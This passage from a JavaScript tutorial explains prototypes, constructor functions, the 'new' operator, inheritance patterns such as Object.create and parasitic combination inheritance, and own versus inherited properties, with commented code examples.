console.log(obj.__proto__ === Object.prototype); // true
```

**Why `Object.prototype` is Important:**

```javascript
// 1. It provides base functionality for all objects
const empty = {};
console.log(empty.toString()); // Works because of Object.prototype.toString

// 2. It's the end of the chain
console.log(Object.prototype.__proto__); // null

// 3. You can extend it (but shouldn't!)
Object.prototype.customMethod = function() {
  return 'Available on all objects';
};

const anyObj = {};
console.log(anyObj.customMethod()); // 'Available on all objects'
// This affects EVERY object in your program - dangerous!

// 4. You can create objects without it
const noProto = Object.create(null);
console.log(noProto.toString); // undefined
console.log(noProto.__proto__); // undefined
// Useful for pure data storage (maps/dictionaries)
```

**Overriding Object.prototype Methods:**

```javascript
function Person(name) {
  this.name = name;
}

// Override toString for better output
Person.prototype.toString = function() {
  return 'Person: ' + this.name;
};

const bob = new Person('Bob');

console.log(bob.toString()); // 'Person: Bob'
console.log(Object.prototype.toString.call(bob)); // '[object Object]'

// The lookup finds Person.prototype.toString first
// If we want the original, we need to call it explicitly
```

**Checking the Prototype Chain:**

```javascript
function Animal(name) {
  this.name = name;
}

const dog = new Animal('Dog');

// Various ways to check prototypes
console.log(dog.__proto__ === Animal.prototype); // true
console.log(Object.getPrototypeOf(dog) === Animal.prototype); // true
console.log(Animal.prototype.isPrototypeOf(dog)); // true
console.log(dog instanceof Animal); // true

// Checking Object.prototype
console.log(Object.prototype.isPrototypeOf(dog)); // true
console.log(dog instanceof Object); // true
```

### Constructor Functions

Constructor functions are regular functions used with the `new` keyword to create objects with shared behavior.

**Basic Constructor Function:**

```javascript
function Person(name, age) {
  // 'this' refers to the new object being created
  this.name = name;
  this.age = age;
}

// Add methods to the prototype (shared by all instances)
Person.prototype.greet = function() {
  console.log('Hello, my name is ' + this.name);
};

Person.prototype.getAge = function() {
  return this.age;
};

// Create instances
const alice = new Person('Alice', 30);
const bob = new Person('Bob', 25);

alice.greet(); // "Hello, my name is Alice"
bob.greet(); // "Hello, my name is Bob"

// Methods are shared (same reference)
console.log(alice.greet === bob.greet); // true

// Properties are separate (different values)
console.log(alice.name === bob.name); // false
```

**Why Use Prototype for Methods:**

```javascript
// BAD: Methods in constructor (created for each instance)
function PersonBad(name) {
  this.name = name;
  this.greet = function() {
    console.log('Hello, ' + this.name);
  };
}

const p1 = new PersonBad('Alice');
const p2 = new PersonBad('Bob');

console.log(p1.greet === p2.greet); // false (separate functions!)
// Each instance has its own copy of greet - memory waste!

// GOOD: Methods on prototype (shared by all instances)
function PersonGood(name) {
  this.name = name;
}

PersonGood.prototype.greet = function() {
  console.log('Hello, ' + this.name);
};

const p3 = new PersonGood('Alice');
const p4 = new PersonGood('Bob');

console.log(p3.greet === p4.greet); // true (same function!)
// All instances share the same method - memory efficient!
```

**Constructor Property:**

```javascript
function Animal(name) {
  this.name = name;
}

const cat = new Animal('Cat');

// Every prototype has a constructor property
console.log(Animal.prototype.constructor === Animal); // true

// Instances inherit this through the prototype chain
console.log(cat.constructor === Animal); // true

// Can use it to create new instances
const dog = new cat.constructor('Dog');
console.log(dog.name); // 'Dog'
console.log(dog instanceof Animal); // true
```

**Constructor Patterns:**

```javascript
// 1. Basic constructor
function Car(make, model) {
  this.make = make;
  this.model = model;
}

Car.prototype.getInfo = function() {
  return this.make + ' ' + this.model;
};

// 2. Constructor with validation
function Person(name, age) {
  if (!(this instanceof Person)) {
    return new Person(name, age); // Allow calling without 'new'
  }
  
  if (typeof name !== 'string') {
    throw new TypeError('Name must be a string');
  }
  
  this.name = name;
  this.age = age;
}

// 3. Constructor with private variables (closure)
function BankAccount(initialBalance) {
  let balance = initialBalance; // Private variable
  
  this.deposit = function(amount) {
    balance += amount;
    return balance;
  };
  
  this.withdraw = function(amount) {
    if (amount > balance) {
      throw new Error('Insufficient funds');
    }
    balance -= amount;
    return balance;
  };
  
  this.getBalance = function() {
    return balance;
  };
}

const account = new BankAccount(1000);
console.log(account.getBalance()); // 1000
account.deposit(500); // 1500
console.log(account.balance); // undefined (private!)

// 4. Constructor with static methods
function MathUtils() {}

MathUtils.add = function(a, b) {
  return a + b;
};

MathUtils.multiply = function(a, b) {
  return a * b;
};

console.log(MathUtils.add(5, 3)); // 8
// Static methods belong to the constructor, not instances
```

### `new` Operator Mechanism

Understanding what happens when you use the `new` keyword is essential for mastering JavaScript's object creation.

**What `new` Does (Step by Step):**

```javascript
function Person(name, age) {
  // Before this line, 'new' does the following:
  // 1. Creates a new empty object
  // 2. Sets the object's [[Prototype]] to Person.prototype
  // 3. Binds 'this' to the new object
  
  this.name = name;
  this.age = age;
  
  // After this line, 'new' does:
  // 4. Returns 'this' (the new object) unless function returns an object
}

const alice = new Person('Alice', 30);
```

**Manual Implementation of `new`:**

```javascript
function myNew(constructor, ...args) {
  // Step 1: Create a new empty object
  const obj = {};
  
  // Step 2: Set the prototype
  Object.setPrototypeOf(obj, constructor.prototype);
  // Or: obj.__proto__ = constructor.prototype;
  
  // Step 3: Call constructor with the new object as 'this'
  const result = constructor.apply(obj, args);
  
  // Step 4: Return the object (or constructor's return value if it's an object)
  return (typeof result === 'object' && result !== null) ? result : obj;
}

// Test the implementation
function Person(name, age) {
  this.name = name;
  this.age = age;
}

Person.prototype.greet = function() {
  console.log('Hello, I am ' + this.name);
};

const bob = myNew(Person, 'Bob', 25);
bob.greet(); // "Hello, I am Bob"
console.log(bob instanceof Person); // true
```

**Step-by-Step Visualization:**

```javascript
function Animal(name) {
  this.name = name;
  this.energy = 100;
}

Animal.prototype.eat = function() {
  this.energy += 10;
};

// When you write: const dog = new Animal('Dog');

// Step 1: Create empty object
// let dog = {};

// Step 2: Set prototype link
// dog.__proto__ = Animal.prototype;
// Now: dog â†’ Animal.prototype â†’ Object.prototype â†’ null

// Step 3: Execute constructor with 'this' = dog
// Animal.call(dog, 'Dog');
// Now: dog = { name: 'Dog', energy: 100 }

// Step 4: Return the object
// return dog;

const dog = new Animal('Dog');
console.log(dog.name); // 'Dog'
console.log(dog.energy); // 100
dog.eat(); // Works because of prototype chain
console.log(dog.energy); // 110
```

**Return Value Behavior:**

```javascript
// 1. No return statement (implicit return of 'this')
function Person1(name) {
  this.name = name;
  // implicit: return this;
}

const p1 = new Person1('Alice');
console.log(p1); // Person1 { name: 'Alice' }

// 2. Return primitive value (ignored)
function Person2(name) {
  this.name = name;
  return 42; // Ignored!
}

const p2 = new Person2('Bob');
console.log(p2); // Person2 { name: 'Bob' }

// 3. Return object (overrides default behavior)
function Person3(name) {
  this.name = name;
  return { custom: 'object' }; // This is returned instead!
}

const p3 = new Person3('Charlie');
console.log(p3); // { custom: 'object' }
console.log(p3 instanceof Person3); // false

// 4. Return null (treated as primitive, ignored)
function Person4(name) {
  this.name = name;
  return null; // Ignored!
}

const p4 = new Person4('Diana');
console.log(p4); // Person4 { name: 'Diana' }
```

**Common Mistakes:**

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.greet = function() {
  console.log('Hello, ' + this.name);
};

// Mistake 1: Forgetting 'new'
const wrong = Person('Alice'); // Returns undefined
console.log(wrong); // undefined
console.log(window.name); // 'Alice' (in non-strict mode - pollutes global!)

// Mistake 2: Using arrow function as constructor
const ArrowPerson = (name) => {
  this.name = name; // Error!
};

// const p = new ArrowPerson('Bob'); // TypeError: ArrowPerson is not a constructor

// Mistake 3: Returning wrong value
function BadConstructor() {
  this.value = 42;
  return 'string'; // Ignored, but confusing
}

const bad = new BadConstructor();
console.log(bad); // BadConstructor { value: 42 }
```

**Safety Pattern:**

```javascript
function SafePerson(name) {
  // Check if called with 'new'
  if (!(this instanceof SafePerson)) {
    return new SafePerson(name); // Call it correctly
  }
  
  this.name = name;
}

// Works both ways
const alice = new SafePerson('Alice');
const bob = SafePerson('Bob'); // Automatically uses 'new'

console.log(alice instanceof SafePerson); // true
console.log(bob instanceof SafePerson); // true
```

### Understanding the Prototype Chain Visually

Visualizing the prototype chain helps understand JavaScript's inheritance model.

**Simple Chain:**

```javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
};

const dog = new Animal('Dog');

/*
Visual representation:

dog (instance object)
  {
    name: 'Dog'
    __proto__: â†’ Animal.prototype
  }
                â†“
        Animal.prototype (object)
          {
            eat: function() {...}
            constructor: Animal
            __proto__: â†’ Object.prototype
          }
                        â†“
                Object.prototype (object)
                  {
                    toString: function() {...}
                    hasOwnProperty: function() {...}
                    ... other methods
                    __proto__: null
                  }
                                â†“
                              null (end of chain)

Chain: dog â†’ Animal.prototype â†’ Object.prototype â†’ null
*/

// Verify the chain
console.log(dog.__proto__ === Animal.prototype); // true
console.log(Animal.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__ === null); // true
```

**Multi-Level Chain:**

```javascript
function Animal(name) {
  this.name = name;
}

Animal.prototype.breathe = function() {
  console.log(this.name + ' is breathing');
};

function Mammal(name, furColor) {
  Animal.call(this, name);
  this.furColor = furColor;
}

Mammal.prototype = Object.create(Animal.prototype);
Mammal.prototype.constructor = Mammal;

Mammal.prototype.produceMilk = function() {
  console.log(this.name + ' is producing milk');
};

function Dog(name, furColor, breed) {
  Mammal.call(this, name, furColor);
  this.breed = breed;
}

Dog.prototype = Object.create(Mammal.prototype);
Dog.prototype.constructor = Dog;

Dog.prototype.bark = function() {
  console.log(this.name + ' is barking: Woof!');
};

const max = new Dog('Max', 'brown', 'Labrador');

/*
Visual representation:

max (instance)
  {
    name: 'Max'
    furColor: 'brown'
    breed: 'Labrador'
    __proto__: â†’ Dog.prototype
  }
                â†“
        Dog.prototype
          {
            bark: function() {...}
            constructor: Dog
            __proto__: â†’ Mammal.prototype
          }
                        â†“
                Mammal.prototype
                  {
                    produceMilk: function() {...}
                    constructor: Mammal
                    __proto__: â†’ Animal.prototype
                  }
                                â†“
                        Animal.prototype
                          {
                            breathe: function() {...}
                            constructor: Animal
                            __proto__: â†’ Object.prototype
                          }
                                        â†“
                                Object.prototype
                                  {
                                    toString: function() {...}
                                    ... other methods
                                    __proto__: null
                                  }
                                                â†“
                                              null

Chain: max â†’ Dog.prototype â†’ Mammal.prototype â†’ Animal.prototype â†’ Object.prototype â†’ null
*/

// Verify the chain
console.log(max.__proto__ === Dog.prototype); // true
console.log(Dog.prototype.__proto__ === Mammal.prototype); // true
console.log(Mammal.prototype.__proto__ === Animal.prototype); // true
console.log(Animal.prototype.__proto__ === Object.prototype); // true
console.log(Object.prototype.__proto__ === null); // true

// All methods are accessible
max.bark(); // "Max is barking: Woof!"
max.produceMilk(); // "Max is producing milk"
max.breathe(); // "Max is breathing"
max.toString(); // "[object Object]"
```

**Property Lookup Visualization:**

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.species = 'Human';
Person.prototype.greet = function() {
  return 'Hello';
};

const alice = new Person('Alice');

// When accessing: alice.name
/*
Lookup path:
1. Check alice object itself
   âœ“ FOUND: { name: 'Alice' }
   STOP and return 'Alice'
*/

// When accessing: alice.species
/*
Lookup path:
1. Check alice object itself
   âœ— Not found
2. Follow __proto__ to Person.prototype
   âœ“ FOUND: { species: 'Human' }
   STOP and return 'Human'
*/

// When accessing: alice.toString
/*
Lookup path:
1. Check alice object itself
   âœ— Not found
2. Follow __proto__ to Person.prototype
   âœ— Not found
3. Follow __proto__ to Object.prototype
   âœ“ FOUND: { toString: function() {...} }
   STOP and return function
*/

// When accessing: alice.nonExistent
/*
Lookup path:
1. Check alice object itself
   âœ— Not found
2. Follow __proto__ to Person.prototype
   âœ— Not found
3. Follow __proto__ to Object.prototype
   âœ— Not found
4. Reach null (end of chain)
   STOP and return undefined
*/
```

---


## 5.2 Prototypal Inheritance

Prototypal inheritance is JavaScript's mechanism for creating object hierarchies where objects inherit properties and methods from other objects through the prototype chain.

### Setting Up Inheritance

There are multiple patterns for establishing inheritance relationships between constructor functions.

**Basic Inheritance Setup:**

```javascript
// Parent constructor
function Animal(name) {
  this.name = name;
  this.energy = 100;
}

Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
  this.energy += 10;
};

Animal.prototype.sleep = function() {
  console.log(this.name + ' is sleeping');
  this.energy = 100;
};

// Child constructor
function Dog(name, breed) {
  // Call parent constructor to initialize parent properties
  Animal.call(this, name);
  this.breed = breed;
}

// Set up prototype chain
Dog.prototype = Object.create(Animal.prototype);

// Restore constructor reference
Dog.prototype.constructor = Dog;

// Add child-specific methods
Dog.prototype.bark = function() {
  console.log(this.name + ' says: Woof!');
};

// Create instance
const buddy = new Dog('Buddy', 'Golden Retriever');

buddy.eat(); // "Buddy is eating" (inherited)
buddy.bark(); // "Buddy says: Woof!" (own method)
console.log(buddy.breed); // 'Golden Retriever' (own property)
console.log(buddy.energy); // 110 (parent property)
```

**Why Each Step Matters:**

```javascript
function Parent(value) {
  this.value = value;
}

Parent.prototype.getValue = function() {
  return this.value;
};

function Child(value, extra) {
  // Step 1: Call parent constructor
  Parent.call(this, value);
  // Without this, child instances won't have parent properties
  this.extra = extra;
}

// WRONG: Direct assignment breaks prototype chain
// Child.prototype = Parent.prototype; // Don't do this!
// Problem: Changes to Child.prototype affect Parent.prototype

// WRONG: Using new without arguments
// Child.prototype = new Parent(); // Don't do this either!
// Problems:
// 1. Parent constructor runs with undefined arguments
// 2. Parent properties end up on prototype, not instances
// 3. Parent constructor might have side effects

// RIGHT: Use Object.create
Child.prototype = Object.create(Parent.prototype);
// This creates a new object that inherits from Parent.prototype
// without calling the Parent constructor

// Step 2: Restore constructor
Child.prototype.constructor = Child;
// Without this, Child instances report Parent as their constructor

// Demonstrate the problems with wrong approaches:

// Wrong approach 1: Direct assignment
function WrongChild1() {}
WrongChild1.prototype = Parent.prototype;
WrongChild1.prototype.wrongMethod = function() { return 'Wrong!'; };

// Now Parent.prototype is polluted!
const parent = new Parent(5);
console.log(parent.wrongMethod); // function! (Shouldn't be there)

// Wrong approach 2: Using new
function WrongChild2() {}
WrongChild2.prototype = new Parent(10);

const wrong2 = new WrongChild2();
console.log(wrong2.value); // 10 (from prototype, not instance!)
wrong2.value = 20;
console.log(wrong2.value); // 20 (own property shadows prototype)

// Correct approach
const correct = new Child(5, 'extra');
console.log(correct.value); // 5 (own property from constructor)
console.log(correct.extra); // 'extra'
console.log(correct.getValue()); // 5 (inherited method)
```

**Complete Inheritance Pattern:**

```javascript
// Parent class
function Vehicle(make, model) {
  this.make = make;
  this.model = model;
  this.speed = 0;
}

Vehicle.prototype.accelerate = function(amount) {
  this.speed += amount;
  console.log(this.make + ' ' + this.model + ' accelerating to ' + this.speed);
};

Vehicle.prototype.brake = function(amount) {
  this.speed = Math.max(0, this.speed - amount);
  console.log(this.make + ' ' + this.model + ' slowing to ' + this.speed);
};

// Child class
function Car(make, model, doors) {
  // 1. Call parent constructor
  Vehicle.call(this, make, model);
  
  // 2. Add child-specific properties
  this.doors = doors;
  this.fuelType = 'gasoline';
}

// 3. Set up prototype chain
Car.prototype = Object.create(Vehicle.prototype);

// 4. Restore constructor
Car.prototype.constructor = Car;

// 5. Add child-specific methods
Car.prototype.openTrunk = function() {
  console.log('Opening trunk of ' + this.make + ' ' + this.model);
};

// 6. Override parent methods if needed
Car.prototype.accelerate = function(amount) {
  // Call parent method
  Vehicle.prototype.accelerate.call(this, amount);
  // Add child-specific behavior
  console.log('Engine roaring!');
};

// Create instance
const myCar = new Car('Toyota', 'Camry', 4);

myCar.accelerate(20);
// "Toyota Camry accelerating to 20"
// "Engine roaring!"

myCar.openTrunk();
// "Opening trunk of Toyota Camry"

console.log(myCar instanceof Car); // true
console.log(myCar instanceof Vehicle); // true
console.log(myCar instanceof Object); // true
```

### `Object.create()` for Inheritance

`Object.create()` is the modern, preferred way to set up prototypal inheritance. It creates a new object with a specified prototype.

**Basic Usage:**

```javascript
// Create a parent object
const animal = {
  type: 'Animal',
  eat: function() {
    console.log(this.name + ' is eating');
  },
  sleep: function() {
    console.log(this.name + ' is sleeping');
  }
};

// Create a child object that inherits from animal
const dog = Object.create(animal);
dog.name = 'Buddy';
dog.breed = 'Golden Retriever';
dog.bark = function() {
  console.log('Woof!');
};

// dog inherits from animal
dog.eat(); // "Buddy is eating" (inherited)
dog.bark(); // "Woof!" (own method)

console.log(dog.type); // 'Animal' (inherited)
console.log(dog.name); // 'Buddy' (own property)

// Verify prototype chain
console.log(Object.getPrototypeOf(dog) === animal); // true
```

**Object.create() with Property Descriptors:**

```javascript
const person = {
  greet: function() {
    console.log('Hello, I am ' + this.name);
  }
};

// Create object with specific property descriptors
const employee = Object.create(person, {
  name: {
    value: 'Alice',
    writable: true,
    enumerable: true,
    configurable: true
  },
  employeeId: {
    value: 'E12345',
    writable: false,
    enumerable: true,
    configurable: false
  },
  salary: {
    value: 50000,
    writable: true,
    enumerable: false, // Won't show in for...in
    configurable: true
  }
});

employee.greet(); // "Hello, I am Alice"
console.log(employee.employeeId); // 'E12345'
// employee.employeeId = 'E99999'; // Won't work (not writable)

for (let key in employee) {
  console.log(key); // Only 'name' and 'employeeId' (salary not enumerable)
}
```

**Factory Pattern with Object.create():**

```javascript
// Factory function for creating animals
function createAnimal(name, species) {
  // Define the prototype
  const animalPrototype = {
    eat: function() {
      console.log(this.name + ' is eating');
      this.hunger -= 20;
    },
    sleep: function() {
      console.log(this.name + ' is sleeping');
      this.energy = 100;
    },
    getStatus: function() {
      return this.name + ' - Energy: ' + this.energy + ', Hunger: ' + this.hunger;
    }
  };
  
  // Create new object with the prototype
  const animal = Object.create(animalPrototype);
  
  // Add properties
  animal.name = name;
  animal.species = species;
  animal.energy = 100;
  animal.hunger = 50;
  
  return animal;
}

const lion = createAnimal('Leo', 'Lion');
const elephant = createAnimal('Dumbo', 'Elephant');

lion.eat(); // "Leo is eating"
console.log(lion.getStatus()); // "Leo - Energy: 100, Hunger: 30"

// They share the same prototype
console.log(Object.getPrototypeOf(lion) === Object.getPrototypeOf(elephant)); // true
```

**Inheritance Chain with Object.create():**

```javascript
// Level 1: Base object
const livingThing = {
  breathe: function() {
    console.log(this.name + ' is breathing');
  }
};

// Level 2: Animal inherits from LivingThing
const animal = Object.create(livingThing);
animal.eat = function() {
  console.log(this.name + ' is eating');
};

// Level 3: Mammal inherits from Animal
const mammal = Object.create(animal);
mammal.produceMilk = function() {
  console.log(this.name + ' is producing milk');
};

// Level 4: Dog inherits from Mammal
const dog = Object.create(mammal);
dog.name = 'Buddy';
dog.breed = 'Labrador';
dog.bark = function() {
  console.log('Woof!');
};

// All methods are accessible through the chain
dog.bark(); // "Woof!" (own)
dog.produceMilk(); // "Buddy is producing milk" (from mammal)
dog.eat(); // "Buddy is eating" (from animal)
dog.breathe(); // "Buddy is breathing" (from livingThing)

// Verify the chain
console.log(Object.getPrototypeOf(dog) === mammal); // true
console.log(Object.getPrototypeOf(mammal) === animal); // true
console.log(Object.getPrototypeOf(animal) === livingThing); // true
console.log(Object.getPrototypeOf(livingThing) === Object.prototype); // true
```

**Object.create(null) - Creating Dictionary Objects:**

```javascript
// Create object with no prototype (truly empty)
const dictionary = Object.create(null);

// No inherited properties or methods
console.log(dictionary.toString); // undefined
console.log(dictionary.hasOwnProperty); // undefined
console.log(dictionary.__proto__); // undefined

// Perfect for storing data without prototype pollution
dictionary['toString'] = 'my value'; // Safe! No conflict with Object.prototype.toString
dictionary['__proto__'] = 'another value'; // Also safe!

console.log(dictionary['toString']); // 'my value'
console.log(dictionary['__proto__']); // 'another value'

// Use case: Configuration objects
const config = Object.create(null);
config.apiUrl = 'https://api.example.com';
config.timeout = 5000;
config.retries = 3;

// No risk of accidentally accessing prototype methods
console.log('toString' in config); // false
console.log('hasOwnProperty' in config); // false

// Regular object for comparison
const normalObj = {};
console.log('toString' in normalObj); // true
console.log('hasOwnProperty' in normalObj); // true
```

### Constructor Stealing

Constructor stealing (also called constructor borrowing) is a technique where a child constructor calls the parent constructor to inherit properties.

**Basic Constructor Stealing:**

```javascript
function Parent(name, age) {
  this.name = name;
  this.age = age;
  this.friends = ['Alice', 'Bob'];
}

function Child(name, age, school) {
  // "Steal" Parent's properties by calling it with 'this'
  Parent.call(this, name, age);
  
  this.school = school;
}

const child1 = new Child('Charlie', 10, 'Elementary');
const child2 = new Child('Diana', 12, 'Middle School');

console.log(child1.name); // 'Charlie'
console.log(child1.friends); // ['Alice', 'Bob']

// Each child has its own copy of properties
child1.friends.push('Eve');
console.log(child1.friends); // ['Alice', 'Bob', 'Eve']
console.log(child2.friends); // ['Alice', 'Bob'] (unchanged!)

// Problem: No prototype chain, can't inherit methods
Parent.prototype.sayHello = function() {
  console.log('Hello from ' + this.name);
};

// child1.sayHello(); // Error: sayHello is not a function
```

**Why Constructor Stealing is Useful:**

```javascript
// Problem with pure prototypal inheritance
function Animal(name) {
  this.name = name;
  this.enemies = []; // Reference type
}

Animal.prototype.addEnemy = function(enemy) {
  this.enemies.push(enemy);
};

function Dog(name) {}
Dog.prototype = new Animal(); // Creates one instance with empty enemies array

const dog1 = new Dog('Buddy');
const dog2 = new Dog('Max');

dog1.addEnemy('Cat');

// Problem: enemies array is shared!
console.log(dog1.enemies); // ['Cat']
console.log(dog2.enemies); // ['Cat'] - Both share the same array!

// Solution: Constructor stealing
function BetterDog(name) {
  Animal.call(this, name); // Each instance gets its own properties
}

const dog3 = new BetterDog('Charlie');
const dog4 = new BetterDog('Duke');

dog3.enemies.push('Mailman');

console.log(dog3.enemies); // ['Mailman']
console.log(dog4.enemies); // [] - Separate arrays!
```

**Passing Arguments:**

```javascript
function Person(name, age, country) {
  this.name = name;
  this.age = age;
  this.country = country;
}

function Employee(name, age, country, department, salary) {
  // Steal Person properties
  Person.call(this, name, age, country);
  
  // Add Employee-specific properties
  this.department = department;
  this.salary = salary;
}

const emp = new Employee('Alice', 30, 'USA', 'Engineering', 80000);

console.log(emp.name); // 'Alice'
console.log(emp.department); // 'Engineering'
console.log(emp.salary); // 80000
```

### Combination Inheritance

Combination inheritance (also called pseudoclassical inheritance) combines constructor stealing with prototype chaining to get the benefits of both.

**Basic Combination Inheritance:**

```javascript
// Parent constructor
function Animal(name) {
  this.name = name;
  this.friends = []; // Instance property
}

// Parent methods on prototype
Animal.prototype.eat = function() {
  console.log(this.name + ' is eating');
};

Animal.prototype.addFriend = function(friend) {
  this.friends.push(friend);
};

// Child constructor
function Dog(name, breed) {
  // 1. Constructor stealing: inherit instance properties
  Animal.call(this, name);
  
  this.breed = breed;
}

// 2. Prototype chaining: inherit methods
Dog.prototype = Object.create(Animal.prototype);
Dog.prototype.constructor = Dog;

// Add child-specific methods
Dog.prototype.bark = function() {
  console.log(this.name + ' says: Woof!');
};

// Create instances
const dog1 = new Dog('Buddy', 'Golden Retriever');
const dog2 = new Dog('Max', 'Labrador');

// Each instance has own properties
dog1.addFriend('Charlie');
dog2.addFriend('Duke');

console.log(dog1.friends); // ['Charlie']
console.log(dog2.friends); // ['Duke'] (separate arrays!)

// Both inherit methods
dog1.eat(); // "Buddy is eating"
dog2.bark(); // "Max says: Woof!"
```

### Parasitic Inheritance

Parasitic inheritance is a pattern where you create an object, augment it with new properties/methods, and return it.

**Basic Parasitic Inheritance:**

```javascript
function createPerson(name, age) {
  // Start with a base object
  const person = {
    name: name,
    age: age
  };
  
  // Augment with methods
  person.sayHello = function() {
    console.log('Hello, I am ' + this.name);
  };
  
  person.getAge = function() {
    return this.age;
  };
  
  return person;
}

// Use the factory
const alice = createPerson('Alice', 30);
alice.sayHello(); // "Hello, I am Alice"

// Problem: Each instance gets new copies of methods (not shared)
const bob = createPerson('Bob', 25);
console.log(alice.sayHello === bob.sayHello); // false (different functions)
```

**Parasitic Combination Inheritance:**

This is the most efficient pattern, combining the benefits of combination inheritance while avoiding its main drawback (calling parent constructor twice).

```javascript
// Helper function for parasitic inheritance
function inheritPrototype(child, parent) {
  // Create object inheriting from parent prototype
  const prototype = Object.create(parent.prototype);
  
  // Restore constructor
  prototype.constructor = child;
  
  // Set as child's prototype
  child.prototype = prototype;
}

// Parent constructor
function Person(name, age) {
  this.name = name;
  this.age = age;
  this.friends = [];
}

Person.prototype.sayHello = function() {
  console.log('Hello, I am ' + this.name);
};

// Child constructor
function Student(name, age, grade) {
  // Call parent constructor once (only place it's called)
  Person.call(this, name, age);
  
  this.grade = grade;
}

// Set up inheritance using helper
inheritPrototype(Student, Person);

// Add child methods
Student.prototype.study = function() {
  console.log(this.name + ' is studying');
};

const alice = new Student('Alice', 16, 11);
alice.sayHello(); // "Hello, I am Alice"
alice.study(); // "Alice is studying"

console.log(alice instanceof Student); // true
console.log(alice instanceof Person); // true
```

### Performance Implications

Understanding the performance characteristics of different inheritance patterns helps make informed decisions.

**Memory Usage:**

```javascript
// Approach 1: Methods in constructor (BAD for memory)
function PersonBad(name) {
  this.name = name;
  
  // Each instance gets its own copy of these functions
  this.sayHello = function() {
    console.log('Hello, ' + this.name);
  };
  
  this.sayGoodbye = function() {
    console.log('Goodbye, ' + this.name);
  };
}

// Approach 2: Methods on prototype (GOOD for memory)
function PersonGood(name) {
  this.name = name;
}

PersonGood.prototype.sayHello = function() {
  console.log('Hello, ' + this.name);
};

PersonGood.prototype.sayGoodbye = function() {
  console.log('Goodbye, ' + this.name);
};

// Memory comparison
const badPeople = [];
const goodPeople = [];

for (let i = 0; i < 1000; i++) {
  badPeople.push(new PersonBad('Person' + i));
  goodPeople.push(new PersonGood('Person' + i));
}

// badPeople: 1000 instances Ã— 2 methods = 2000 function objects
// goodPeople: 1000 instances + 2 shared methods = 1002 function objects

// Check memory (methods are not shared in bad approach)
console.log(badPeople[0].sayHello === badPeople[1].sayHello); // false
console.log(goodPeople[0].sayHello === goodPeople[1].sayHello); // true
```

**Lookup Performance:**

```javascript
// Shallow prototype chain (FAST)
function FastClass() {
  this.value = 42;
}

FastClass.prototype.getValue = function() {
  return this.value;
};

const fast = new FastClass();

// Deep prototype chain (SLOWER)
function Level1() { this.value = 42; }
Level1.prototype.method1 = function() {};

function Level2() {}
Level2.prototype = Object.create(Level1.prototype);
Level2.prototype.method2 = function() {};

function Level3() {}
Level3.prototype = Object.create(Level2.prototype);
Level3.prototype.method3 = function() {};

function Level4() {}
Level4.prototype = Object.create(Level3.prototype);
Level4.prototype.method4 = function() {};

const deep = new Level4();

// Accessing method1 requires traversing the entire chain
// fast.getValue() â†’ one lookup
// deep.method1() â†’ four lookups (Level4 â†’ Level3 â†’ Level2 â†’ Level1)
```

---

## 5.3 Property Inheritance

Property inheritance determines how properties are accessed and distinguished between an object's own properties and those inherited through the prototype chain.

### Own Properties vs Inherited Properties

JavaScript distinguishes between properties defined directly on an object (own properties) and properties inherited from the prototype chain.

**Understanding Own Properties:**

```javascript
function Person(name, age) {
  this.name = name; // Own property
  this.age = age;   // Own property
}

Person.prototype.species = 'Human'; // Inherited property

Person.prototype.greet = function() { // Inherited property (method)
  console.log('Hello, I am ' + this.name);
};

const alice = new Person('Alice', 30);

// Own properties (defined on instance)
console.log(alice.name); // 'Alice' (own)
console.log(alice.age);  // 30 (own)

// Inherited properties (from prototype)
console.log(alice.species); // 'Human' (inherited)
console.log(typeof alice.greet); // 'function' (inherited)

// Check where properties come from
console.log(alice.hasOwnProperty('name'));    // true
console.log(alice.hasOwnProperty('age'));     // true
console.log(alice.hasOwnProperty('species')); // false (inherited)
console.log(alice.hasOwnProperty('greet'));   // false (inherited)
```

### `hasOwnProperty()`

The `hasOwnProperty()` method determines whether an object has a property as its own (not inherited).

**Basic Usage:**

```javascript
const obj = {
  ownProp: 'I am own',
  anotherOwn: 42
};

console.log(obj.hasOwnProperty('ownProp'));      // true
console.log(obj.hasOwnProperty('anotherOwn'));   // true
console.log(obj.hasOwnProperty('toString'));     // false (inherited from Object.prototype)
console.log(obj.hasOwnProperty('nonExistent'));  // false
```

### `Object.hasOwn()`

`Object.hasOwn()` is a modern alternative to `hasOwnProperty()` introduced in ES2022, providing a more reliable way to check for own properties.

**Basic Usage:**

```javascript
const obj = {
  name: 'Alice',
  age: 30
};

// Modern way (ES2022+)
console.log(Object.hasOwn(obj, 'name')); // true
console.log(Object.hasOwn(obj, 'age'));  // true
console.log(Object.hasOwn(obj, 'toString')); // false

// Old way (still works)
console.log(obj.hasOwnProperty('name')); // true
```

### Property Enumeration and Inheritance

Different methods enumerate properties differently, especially regarding inherited properties.

**Enumeration Methods Comparison:**

```javascript
function Parent(x) {
  this.x = x;
}

Parent.prototype.parentMethod = function() {};

function Child(x, y) {
  Parent.call(this, x);
  this.y = y;
}

Child.prototype = Object.create(Parent.prototype);
Child.prototype.constructor = Child;
Child.prototype.childMethod = function() {};

const obj = new Child(1, 2);
obj.z = 3;

// Non-enumerable property
Object.defineProperty(obj, 'hidden', {
  value: 'secret',
  enumerable: false
});

console.log('=== for...in (enumerable own + inherited) ===');
for (let key in obj) {
  console.log(key);
}
// Output: x, y, z, parentMethod, childMethod

console.log('\n=== Object.keys (enumerable own only) ===');
console.log(Object.keys(obj));
// Output: ['x', 'y', 'z']

console.log('\n=== Object.getOwnPropertyNames (all own, including non-enumerable) ===');
console.log(Object.getOwnPropertyNames(obj));
// Output: ['x', 'y', 'z', 'hidden']
```

### Shadowing Properties

Property shadowing occurs when an object has an own property with the same name as an inherited property, effectively hiding the inherited property.

**Basic Shadowing:**

```javascript
function Person() {}
Person.prototype.name = 'Default Name';

const alice = new Person();

// Access prototype property
console.log(alice.name); // 'Default Name'
console.log(alice.hasOwnProperty('name')); // false

// Create own property (shadows prototype)
alice.name = 'Alice';

console.log(alice.name); // 'Alice' (own property)
console.log(alice.hasOwnProperty('name')); // true

// Prototype property is unchanged
console.log(Person.prototype.name); // 'Default Name'

// Other instances still use prototype
const bob = new Person();
console.log(bob.name); // 'Default Name'

// Delete own property to reveal prototype property
delete alice.name;
console.log(alice.name); // 'Default Name' (back to prototype)
console.log(alice.hasOwnProperty('name')); // false
```

---


## 5.4 Prototypes Summary

